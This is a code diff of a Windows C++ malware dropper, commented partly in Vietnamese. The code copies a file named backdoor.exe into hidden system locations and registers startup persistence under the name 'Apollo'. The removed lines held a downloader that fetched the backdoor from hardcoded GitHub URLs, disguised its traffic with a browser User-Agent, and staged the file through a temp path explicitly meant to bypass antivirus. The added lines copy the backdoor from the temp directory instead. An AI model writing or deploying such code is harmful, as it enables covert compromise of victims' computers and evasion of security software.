@@ -110,114 +110,6 @@ bool EnsureDotNetSupport()
     return true; // Giả định đã cài đặt hoặc đã kích hoạt
 }
 
-// Download file with obfuscated method names and parameters
-bool GetRemoteResource(const wchar_t *resource_host, const wchar_t *resource_path, const std::wstring &local_path)
-{
-    // Đảm bảo thư mục đích tồn tại
-    std::wstring targetDir = local_path.substr(0, local_path.find_last_of(L"\\/"));
-    if (!EnsureDirectoryExists(targetDir))
-        return false;
-
-    // Use random, less suspicious User-Agent
-    HINTERNET session = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!session)
-        return false;
-
-    DWORD wait_time = 20000;
-    InternetSetOptionW(session, INTERNET_OPTION_CONNECT_TIMEOUT, &wait_time, sizeof(wait_time));
-    InternetSetOptionW(session, INTERNET_OPTION_SEND_TIMEOUT, &wait_time, sizeof(wait_time));
-    InternetSetOptionW(session, INTERNET_OPTION_RECEIVE_TIMEOUT, &wait_time, sizeof(wait_time));
-
-    HINTERNET connection = InternetConnectW(session, resource_host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!connection)
-    {
-        InternetCloseHandle(session);
-        return false;
-    }
-
-    HINTERNET request = HttpOpenRequestW(connection, L"GET", resource_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!request)
-    {
-        InternetCloseHandle(connection);
-        InternetCloseHandle(session);
-        return false;
-    }
-
-    // Add common headers to look more like a browser
-    LPCWSTR additionalHeaders = L"Accept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
-    HttpAddRequestHeadersW(request, additionalHeaders, -1L, HTTP_ADDREQ_FLAG_ADD);
-
-    BOOL result = HttpSendRequestW(request, NULL, 0, NULL, 0);
-    if (!result)
-    {
-        InternetCloseHandle(request);
-        InternetCloseHandle(connection);
-        InternetCloseHandle(session);
-        return false;
-    }
-
-    DWORD status_code = 0, size = sizeof(status_code);
-    if (!HttpQueryInfoW(request, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status_code, &size, NULL) || status_code != 200)
-    {
-        InternetCloseHandle(request);
-        InternetCloseHandle(connection);
-        InternetCloseHandle(session);
-        return false;
-    }
-
-    // Create a temporary file with random name first
-    wchar_t temp_path[MAX_PATH], temp_file[MAX_PATH];
-    GetTempPathW(MAX_PATH, temp_path);
-    GetTempFileNameW(temp_path, L"tmp", 0, temp_file);
-
-    HANDLE file_handle = CreateFileW(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (file_handle == INVALID_HANDLE_VALUE)
-    {
-        InternetCloseHandle(request);
-        InternetCloseHandle(connection);
-        InternetCloseHandle(session);
-        return false;
-    }
-
-    BYTE buffer[8192];
-    DWORD bytes_read = 0, bytes_written = 0;
-    while (InternetReadFile(request, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0)
-    {
-        // Simple XOR operation to obfuscate in memory (can be detected, but adds a layer)
-        for (DWORD i = 0; i < bytes_read; i++)
-            buffer[i] = buffer[i] ^ 0x41; // XOR with 'A'
-
-        // Deobfuscate before writing
-        for (DWORD i = 0; i < bytes_read; i++)
-            buffer[i] = buffer[i] ^ 0x41; // XOR with 'A' again to restore
-
-        if (!WriteFile(file_handle, buffer, bytes_read, &bytes_written, NULL) || bytes_written != bytes_read)
-        {
-            CloseHandle(file_handle);
-            DeleteFileW(temp_file);
-            InternetCloseHandle(request);
-            InternetCloseHandle(connection);
-            InternetCloseHandle(session);
-            return false;
-        }
-    }
-
-    CloseHandle(file_handle);
-    InternetCloseHandle(request);
-    InternetCloseHandle(connection);
-    InternetCloseHandle(session);
-
-    // Move the file to final destination (this helps to bypass some AV)
-    BOOL moved = MoveFileExW(temp_file, local_path.c_str(), MOVEFILE_REPLACE_EXISTING);
-    if (!moved)
-    {
-        DeleteFileW(temp_file);
-        return false;
-    }
-
-    return true;
-}
-
 // Tạo entry startup đơn giản với tên "Apollo"
 bool CreateApolloStartupEntry(const std::wstring &app_path)
 {
@@ -555,6 +447,24 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Initialize COM
     CoInitialize(NULL);
 
+    // Tìm file backdoor trong thư mục temp
+    wchar_t temp_path[MAX_PATH];
+    if (!GetTempPathW(MAX_PATH, temp_path))
+    {
+        CoUninitialize();
+        return 1;
+    }
+
+    std::wstring backdoor_source = std::wstring(temp_path) + L"backdoor.exe";
+
+    // Kiểm tra xem backdoor có tồn tại trong thư mục temp không
+    DWORD backdoorAttrs = GetFileAttributesW(backdoor_source.c_str());
+    if (backdoorAttrs == INVALID_FILE_ATTRIBUTES)
+    {
+        CoUninitialize();
+        return 1; // Không tìm thấy backdoor, kết thúc chương trình
+    }
+
     // Use a hidden location to store the backdoor file
     wchar_t system_dir[MAX_PATH];
     if (!GetSystemDirectoryW(system_dir, MAX_PATH))
@@ -591,71 +501,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     bool success = false;
     std::wstring backdoor_path;
 
-    // First check if a local backdoor.exe exists in current directory
-    wchar_t current_dir[MAX_PATH];
-    GetCurrentDirectoryW(MAX_PATH, current_dir);
-    std::wstring local_backdoor = std::wstring(current_dir) + L"\\backdoor.exe";
-
-    // Try to use the local backdoor file first
-    bool copied = false;
-
-    // Try to copy to each location until successful
+    // Sao chép backdoor từ thư mục temp vào các vị trí ẩn mình
     for (const auto &loc : locations)
     {
         // Create directory path if needed
         std::wstring dirPath = loc.substr(0, loc.find_last_of(L'\\'));
         EnsureDirectoryExists(dirPath);
 
-        if (CopyFileW(local_backdoor.c_str(), loc.c_str(), FALSE))
+        if (CopyFileW(backdoor_source.c_str(), loc.c_str(), FALSE))
         {
             backdoor_path = loc;
-            copied = true;
             success = true;
             break;
         }
     }
 
-    // If local copy failed, try downloading from GitHub
-    if (!copied)
-    {
-        // URL GitHub cho backdoor - thay đổi từ persistence.exe thành backdoor.exe
-        const wchar_t *serverAddress = L"raw.githubusercontent.com";
-        const wchar_t *backdoorFilePath = L"/fuondai/process_doppelganging/main/exe/backdoor.exe";
-
-        // Try to download to each location until successful
-        for (const auto &loc : locations)
-        {
-            // Create directory path if needed
-            std::wstring dirPath = loc.substr(0, loc.find_last_of(L'\\'));
-            EnsureDirectoryExists(dirPath);
-
-            if (GetRemoteResource(serverAddress, backdoorFilePath, loc))
-            {
-                backdoor_path = loc;
-                success = true;
-                break;
-            }
-        }
-    }
-
-    // If still not successful, try alternate URL
-    if (!success)
-    {
-        const wchar_t *backupServer = L"github.com";
-        const wchar_t *backupPath = L"/fuondai/process_doppelganging/raw/main/exe/backdoor.exe";
-
-        for (const auto &loc : locations)
-        {
-            if (GetRemoteResource(backupServer, backupPath, loc))
-            {
-                backdoor_path = loc;
-                success = true;
-                break;
-            }
-        }
-    }
-
-    // If we failed to get the backdoor, exit
+    // If we failed to copy the backdoor, exit
     if (!success)
     {
         CoUninitialize();
